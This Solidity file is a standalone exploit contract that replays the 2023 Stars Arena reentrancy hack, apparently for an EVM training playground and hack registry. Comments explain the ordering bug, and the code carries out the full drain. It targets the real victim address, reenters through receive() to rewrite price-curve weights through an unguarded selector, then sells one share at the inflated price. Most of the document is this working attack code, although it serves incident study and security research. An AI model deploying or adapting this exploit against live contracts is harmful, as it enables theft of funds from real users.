// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-10-StarsArena).
//
// The DeFiHackLabs PoC (test/StarsArena_exp.sol) runs the whole attack INLINE
// in the Foundry `ContractTest` harness — the `receive()` reentrancy hook lives
// on the test contract itself (`attacker = address(this)`), and profit is the
// test contract's own AVAX balance delta. There is no standalone contract to
// deploy. This file is a faithful, cheatcode-free copy of that inline attack
// (the testExploit body + the receive() reentrancy trigger), compiled inside
// the registry forge project.
//
// Root cause (see evm-hack-registry/2023-10-StarsArena_exp/StarsArena_exp.md):
// Stars Arena's buySharesWithReferrer pays the subject/referrer fee AND
// refunds the overpayment via a raw AVAX `call` BEFORE it writes the buyer's
// share balance. Because the attacker passes ITSELF as both subject and
// referrer, that fee call hands control back to the attacker mid-buy. During
// this reentrant window the attacker calls the permissionless, unverified
// weight setter at selector 0x5632b2e4(uint256,uint256,uint256,uint256),
// rewriting all four price-curve multipliers to 91e9. The setter's guard
// ("caller has no shares yet") still passes ONLY because buySharesWithReferrer
// has not yet written the buyer's share count — the very ordering bug being
// exploited. Once the buy finishes, the attacker holds 1 share priced by the
// now-inflated curve; a single sellShares(self, 1) returns 274,332.968 AVAX
// gross for a share that cost only 0.014 AVAX to buy.
//
// The victim's logic contract was never verified on-chain (this opacity is
// exactly why the bug could ship silently); the selectors below are read
// straight from the on-chain trace / the reconstructed pseudo-Solidity in
// StarsArena_exp.md, not from a public ABI.

interface IStarsArena {
    // selector 0xe9ccf3a3 (confirmed via `cast sig`)
    function buySharesWithReferrer(address subject, uint256 amount, address referrer) external payable;
    // real name/signature, used verbatim in the original PoC
    function sellShares(address subject, uint256 amount) external;
}

contract StarsArenaDrain {
    address private constant VICTIM = 0xA481B139a1A654cA19d2074F174f17D7534e8CeC;

    // Fires exactly once: the fee callback inside buySharesWithReferrer is the
    // only reentrant window this attack needs.
    bool private reentered;

    function attack() external {
        // 1 AVAX buy capital already sits in this contract's own balance
        // (setup.steps funds it — mirrors the original `deal(address(this), 1 ether)`).
        IStarsArena(VICTIM).buySharesWithReferrer{value: address(this).balance}(
            address(this), 1, address(this)
        );

        // The reentrant call inside the fee callback above already rewrote the
        // price-curve weights to 91e9 each; sell the single share back now
        // that it is priced off the inflated curve.
        IStarsArena(VICTIM).sellShares(address(this), 1);
    }

    receive() external payable {
        // Only the victim's own fee callback should trigger the reentrant
        // weight rewrite. The original PoC funds itself via `deal()`, a
        // cheatcode that sets the balance directly WITHOUT invoking
        // receive() at all; this synthetic contract is instead funded via a
        // real value-transfer (setup.steps), which DOES invoke receive() —
        // so gate on the caller to avoid mistaking that funding transfer for
        // the victim's mid-buy fee callback.
        if (msg.sender == VICTIM && !reentered) {
            reentered = true;
            // Reconstructed selector 0x5632b2e4(uint256,uint256,uint256,uint256)
            // — the permissionless price-curve weight setter. Its "caller has
            // no shares yet" guard still passes here because
            // buySharesWithReferrer has not yet written our share balance.
            (bool ok,) = VICTIM.call(abi.encodeWithSelector(bytes4(0x5632b2e4), 91e9, 91e9, 91e9, 91e9));
            require(ok, "weight rewrite failed");
        }
    }
}
